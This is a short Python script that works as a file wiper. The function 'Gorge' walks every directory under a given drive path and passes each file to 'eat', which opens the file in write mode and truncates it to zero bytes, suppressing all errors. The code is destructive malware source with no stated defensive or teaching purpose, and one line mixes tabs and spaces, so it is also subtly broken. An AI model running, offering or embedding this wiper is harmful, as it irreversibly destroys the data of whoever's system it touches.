import os
def eat(path):
    if os.path.exists(path):
        if os.path.isfile(path):
            try:
                spaghetti = open (path, "w")
                spaghetti.close()
            except:
                print ("an error occured")
        else:
            print ("This file is not a regular file")
    else:
        print ("path doesnt exist")

def Gorge(abs_drive):
    for root, dirs, files in os.walk(abs_drive):
        for name in files:
                try:
                	t = os.path.join(root,name)
                    eat(t)
                except:
                        pass
